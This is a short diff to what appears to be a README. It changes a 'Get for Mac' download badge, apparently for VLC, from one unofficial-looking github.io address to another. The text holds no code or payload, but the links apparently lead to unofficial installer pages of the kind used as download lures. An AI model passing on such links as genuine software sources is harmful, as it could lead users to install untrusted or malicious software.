@@ -6,7 +6,7 @@
 <br>
 <div align="center">
 
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://osx-software-2025.github.io/.github/vlc)
+[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://installation-osx.github.io/.github/vlc)
 
 </div>
 
